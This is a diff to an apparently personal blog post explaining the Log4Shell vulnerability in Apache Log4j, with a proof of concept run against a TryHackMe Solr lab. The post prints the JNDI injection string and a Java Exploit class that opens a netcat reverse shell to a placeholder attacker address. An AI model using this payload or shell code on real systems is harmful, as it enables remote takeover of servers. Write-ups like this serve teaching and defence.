@@ -20,7 +20,7 @@ logging.ERROR(&amp;quot;error&amp;quot;); logging.WARN(&amp;quot;warning&amp;quo
 &lt;pre&gt;&lt;code&gt;logging.ERROR(&amp;quot;error&amp;quot;);
 logging.WARN(&amp;quot;warning&amp;quot;);
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now a logger logs everything. Every interactions with the application along with the time and ip address. But the vulnerability in log4j happens when the attacker can craft or manipulate what is logged. Let say it is logging the username and the username is like this&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/1.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/blogs/log4j/1.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Now that username is the actual format used for RCE using log4j. The exploit is:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;${jndi:ldap://ATTACKER-SERVER/x}
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The exploit can be broken into:&lt;/p&gt;
@@ -30,14 +30,14 @@ logging.WARN(&amp;quot;warning&amp;quot;);
 &lt;li&gt;The victim requests the malicious code and executes it, leading to RCE.&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;The process can be visualized with the following figure by &lt;a href=&#34;https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/&#34;&gt;GovCERT&lt;/a&gt;
-&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/blogs/log4j/2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;The vulnerability was first reported to Apache on 24th November 2021 and publicly announced on 9th December 2021. Many large organizations are affected by this CVE which includes Amazon, Google, Tencent and others. You can find the list &lt;a href=&#34;https://github.com/YfryTchsGD/Log4jAttackSurface&#34;&gt;here&lt;/a&gt;&lt;/p&gt;
 &lt;h1 id=&#34;proof-of-concept&#34;&gt;Proof of Concept&lt;/h1&gt;
 &lt;p&gt;We will be using the TryHackMe Solr room for this. The victim machine is running Apache Solr 8.11.0, which has this vulnerability. First I am creating a ldap Reference server. The Reference server will point to another server which will serve the malicious java code. Both the server are running on same machines but different ports.&lt;/p&gt;
 &lt;p&gt;For ldap reference server, we will use &lt;a href=&#34;https://github.com/mbechler/marshalsec&#34;&gt;marshalsec&lt;/a&gt;. It will serve on port 1389 and point to port 8000. Here is the screenshot
-&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Now in port 8000, the compiled class of the following java code is served.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-Java&#34; data-lang=&#34;Java&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Exploit&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/blogs/log4j/3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now in port 8000, the compiled class of the following java code is served.
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Exploit&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
     &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
         &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
             java&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Runtime&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getRuntime&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
@@ -45,10 +45,10 @@ logging.WARN(&amp;quot;warning&amp;quot;);
             e&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;printStackTrace&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
         &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
     &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
-&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The code just sends a reverse shell to the attacker.&lt;/p&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+The code just sends a reverse shell to the attacker.&lt;/p&gt;
 &lt;p&gt;Now as we are interacting with the victim server using curl and passing the exploit as a parameter, it is getting executed and we are getting the reverse shell from the server.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/4.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/blogs/log4j/4.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
 &lt;p&gt;The CVE have been patched in log4j update by disabling jndi by default. &lt;a href=&#34;https://log4shell.huntress.com/&#34;&gt;HuntresLabs scanner&lt;/a&gt; can be used to check for Log4Shell vulnerability in your app.&lt;/p&gt;
 &lt;p&gt;Some of the resources I used to learn about this:&lt;/p&gt;
